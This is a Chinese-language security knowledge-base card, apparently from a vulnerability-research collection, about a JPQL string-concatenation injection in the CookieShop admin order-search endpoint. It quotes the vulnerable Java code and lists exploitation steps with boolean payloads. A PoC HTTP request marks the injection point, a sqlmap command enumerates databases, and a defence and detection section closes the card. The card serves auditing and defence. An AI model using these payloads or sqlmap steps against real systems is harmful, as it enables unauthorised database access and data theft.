---
id: cookieshop-custorder-search-jpql-concat-injection
title: CookieShop 订单多条件查询 JPQL 字符串拼接注入（name/phone/address 可控）
type: scenario
domain: web
path: web/generic/sqli
technique: jpql-concat-injection
tags:
- sqli
- java
- jpa
- jpql
- hibernate
- spring-boot
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-18
  verified_at: '2026-11-08T12:17:15+08:00'
  notes: 已对照原文核对：img24 CustOrderServiceImpl 中 jpql 直接拼接 getName()/getPhone()/getAddress()（CONCAT('%','+...+'%')）、img25 searchCustOrdersByFieldsByPage @RequestParam 多字段可控、img26 entityManager.createQuery(jpql) 执行，sink 为 JPQL 字符串拼接，与原文一致；原文提供 sqlmap 实测请求（name=1*）。dedup：hibernate-hql/newbeemall/jeecg 等候选均 related，非同链；dup-scan 中 jfinalcms-orderby、sqlite-jdbc 两 pair 亦为不同注入点，保留。未验证点：原文未给出 sqlmap 注入成功的回显截图。
url: /docs/web/generic/sqli/cookieshop-custorder-search-jpql-concat-injection/
draft: false
kb_aliases:
- CookieShop SQL 注入
- searchCustOrdersByFieldsByPage 注入
- JPQL 拼接注入
- Hibernate createQuery 拼接注入
---

## 一句话结论

CookieShop 后台订单多条件查询把 `name`、`phone`、`address` 等字符串字段直接拼进 JPQL，再用 `entityManager.createQuery(jpql)` 执行，攻击者只要登录后台就能通过 `name` 参数注入布尔/联合/时间条件，由 Hibernate 翻译成 SQL 后落到 MariaDB 执行。

## 原理

该系统的多数 DAO 使用 Spring Data JPA 的参数绑定（`@Query` 里的 `:param` 或方法名派生查询），这部分无法注入。但在 `CustOrderServiceImpl` 的分页查询实现里，业务为了支持“任意字段可选”的动态检索，手工拼接 JPQL 字符串：

```java
String jpql = "select count(*) as countNum from CustOrderBean c where 1=1";
if (custOrder.getName() != null) {
    jpql += " and c.name like CONCAT('%'," + custOrder.getName() + "', '%')";
}
if (custOrder.getStatus() != null) {
    jpql += " and c.status = " + custOrder.getStatus();
}
...
Query query = entityManager.createQuery(jpql);
```

`createQuery(String)` 接收的是一段查询文本，Hibernate 在解析阶段就把它编译成 SQL AST。用户输入一旦被 `+=` 拼进文本，就从“值”变成了“语法”，可以闭合 `CONCAT` 的引号并追加 `or 1=1`、`and extractvalue(...)`、`and sleep(...)` 等片段。`name` 是 `String` 类型，拼接时被包在 `'` 内，因此具备可闭合的单引号；`status`/`paytype` 是 `Integer`，拼接后没有引号且不能携带任意字符，注入面小得多；`phone`、`address` 同理使用 `CONCAT('%', ... ,'%')` 包裹，也可闭合。

控制器 `CustOrderController.searchCustOrdersByFieldsByPage` 以 `@RequestParam` 逐字段接收 `name`、`active`、`total`、`amount`、`status`、`paytype`、`phone`、`address`、`orderDateTime`、`user`、`page`、`rows`，只做了 `StringUtils.isBlank()` 判空，没有任何字符过滤，随后组装成 `CustOrderBean` 传给 service，整条链路无净化点。

## 触发条件

- 目标部署 CookieShop（Spring Boot + JPA/Hibernate + MariaDB）；
- 攻击者能访问后台订单列表接口（`/custOrderController/searchCustOrdersByFieldsByPage`），通常需要已登录会话；
- `name`（或 `phone`/`address`）参数非空，进入拼接分支。

## 利用步骤

1. 以任意可登录账号进入后台“订单”页面，抓取查询请求，确认 `POST /custOrderController/searchCustOrdersByFieldsByPage`；
2. 在 `name` 参数后缀单引号并构造布尔条件（`1' and '1'='1` / `1' and '1'='2`），对比返回条数与 `total` 差异确认注入；
3. 确认后用 sqlmap 指向该请求（`--data` 指定完整表单体，`*` 标注注入点）跑库名、表名、字段；
4. 也可走 UNION 或报错路径直接取数据，Hibernate 6 起 JPQL 支持部分 `UNION` 与 `/**/` 注释，需按实际拼接位置闭合剩余 `', '%')` 尾巴。

## PoC

原始请求（后台订单查询）：

```http
POST /custOrderController/searchCustOrdersByFieldsByPage HTTP/1.1
Host: 192.168.204.151:8080
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: JSESSIONID=<后台会话>

name=1*&active=&total=&amount=&status=&paytype=&phone=&address=&orderDateTime=&user=&page=1&rows=10
```

拼接结果等价于：

```sql
-- JPQL
select count(*) as countNum from CustOrderBean c where 1=1
  and c.name like CONCAT('%',1' and '1'='1', '%')
-- 闭合后可控后续条件
```

sqlmap 最小用法：

```bash
sqlmap -r order_search.txt -p name --batch --dbs
```

（本条为审计+实测注入点，未在卡片中附带具体 dump 结果。）

## 变体与关联

- 同函数内 `phone`、`address` 走同样的 `CONCAT('%', ... ,'%')` 拼接，是等价注入点，可用于绕过针对 `name` 的单点防御；
- 同一项目的 `searchCountSearchCustOrdersByFieldsRecords`（计数查询）与列表查询共用拼接逻辑，计数接口同样可注入，且返回体更小、更适合盲注；
- 关联：Hibernate HQL/JPQL 拼接注入通用手法、MyBatis `${}` 注入；根因一致——用户输入进入查询文本而非参数绑定；
- 该产品其余 DAO 使用 `@Query` 命名参数，说明“同一项目内参数化与拼接混用”是审计时最容易漏判的形态。

## 检测与防御

- 代码层：所有 JPQL 改为 `setParameter()` 绑定，`like` 用 `like :name` 并在 Java 侧拼 `%` 通配符；动态排序字段用枚举白名单映射，不要拼接字段名；
- 审计特征：搜索 `createQuery(` + `+=`、`String.format`、`"..." + param`，重点看 `like CONCAT`、`where 1=1` 这类动态 SQL 构造函数；
- 运行层：对查询参数做长度与字符白名单校验，WAF 对单引号、`and/or`、`sleep(`、`extractvalue(` 组合告警；
- 权限层：订单查询接口应校验当前用户的数据范围（本人/本部门），减少低权账号的注入面。
